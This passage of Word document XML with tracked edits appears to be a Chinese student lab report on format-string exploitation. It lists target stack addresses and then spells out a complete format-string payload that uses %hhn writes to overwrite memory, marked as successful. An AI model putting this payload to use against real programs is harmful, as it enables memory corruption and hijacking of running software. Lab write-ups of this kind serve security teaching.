          <w:ins w:id="116" w:author="zhao ruizhi" w:date="2023-05-08T15:07:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="117" w:author="zhao ruizhi" w:date="2023-05-08T15:07:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>&amp;</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ef</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>：ffff</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>d048</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1C84D526" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="118" w:author="zhao ruizhi" w:date="2023-05-08T15:07:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="119" w:author="zhao ruizhi" w:date="2023-05-08T15:07:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>&amp;</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>be</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ffffd049</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2EF1D2CB" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="120" w:author="zhao ruizhi" w:date="2023-05-08T15:08:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="121" w:author="zhao ruizhi" w:date="2023-05-08T15:07:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>&amp;</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ad</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="122" w:author="zhao ruizhi" w:date="2023-05-08T15:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ffff</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>d04a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E30943C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="123" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="124" w:author="zhao ruizhi" w:date="2023-05-08T15:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>&amp;</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>de</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>：f</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>fffd04b</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78B37725" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="125" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="126" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>可得大致的攻击字符串：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="17EEACDF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="127" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="128" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
            <w:rPr>
              <w:ins w:id="129" w:author="zhao ruizhi" w:date="2023-05-08T15:02:00Z"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="130" w:author="zhao ruizhi" w:date="2023-05-08T15:11:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="842" w:firstLine="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="131" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="132" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma"/>
                <w:sz w:val="24"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>0xad</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ffff</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>d04a</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="133" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma"/>
                <w:sz w:val="24"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t xml:space="preserve"> &lt; 0xbe</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="134" w:author="zhao ruizhi" w:date="2023-05-08T15:10:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ffffd049</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="135" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="136" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma"/>
                <w:sz w:val="24"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t xml:space="preserve"> &lt; 0xde</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="137" w:author="zhao ruizhi" w:date="2023-05-08T15:10:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>f</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>fffd04b</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="138" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="139" w:author="zhao ruizhi" w:date="2023-05-08T15:09:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma"/>
                <w:sz w:val="24"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t xml:space="preserve"> &lt; 0xef</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="140" w:author="zhao ruizhi" w:date="2023-05-08T15:10:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>（</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>ffff</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>d048</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3A6AA62D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="141" w:author="zhao ruizhi" w:date="2023-05-08T15:11:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="142" w:author="zhao ruizhi" w:date="2023-05-08T15:11:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>攻击字符串如下：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2875EAE9" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="143" w:author="zhao ruizhi" w:date="2023-05-08T15:28:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="144" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\x</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="145" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="146" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\x</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="147" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>d0</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="148" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\xff\x</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="149" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>f</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="150" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>f@@@@</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="151" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\x4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\xd0\xff\xff</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="152" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>@@@@</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="153" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\x4</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="154" w:author="zhao ruizhi" w:date="2023-05-08T15:14:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>b</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="155" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\xd0\xff\xff</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="156" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>@@@@</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="157" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\x4</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="158" w:author="zhao ruizhi" w:date="2023-05-08T15:14:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="159" w:author="zhao ruizhi" w:date="2023-05-08T15:13:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>\xd0\xff\xff</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="160" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>%.8x%.8x%.8x%.8x</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="161" w:author="zhao ruizhi" w:date="2023-05-08T15:26:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>%.8x</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="162" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>%.1</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="163" w:author="zhao ruizhi" w:date="2023-05-08T15:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>05</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="164" w:author="zhao ruizhi" w:date="2023-05-08T15:12:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>x%hhn%.17x%hhn%.32x%hhn%.17x%hhn</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4EC1A8F6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="165" w:author="zhao ruizhi" w:date="2023-05-08T15:28:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="166" w:author="zhao ruizhi" w:date="2023-05-08T15:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>攻击成功：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="767BC7AC" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:rPrChange w:id="167" w:author="zhao ruizhi" w:date="2023-05-08T15:11:00Z">
            <w:rPr>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="168" w:author="zhao ruizhi" w:date="2023-05-08T15:28:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="6"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="842" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="169" w:author="zhao ruizhi" w:date="2023-05-08T15:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56606B7D" wp14:editId="4C088555">
              <wp:extent cx="5274310" cy="1492885"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="20647435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43577" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId25"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1492885"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="05A7F751" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17C78C36" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:del w:id="170" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="171" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:delText>实验结果参考：</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5D5AA66B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:del w:id="172" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="173" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:delText>问题①：</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="79AF368D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="174" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="175" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7DEFEF6F" wp14:editId="78C16231">
              <wp:extent cx="5274310" cy="5975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274310" cy="597535"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="51CCBDB3" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:del w:id="176" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
        </w:rPr>
      </w:pPr>
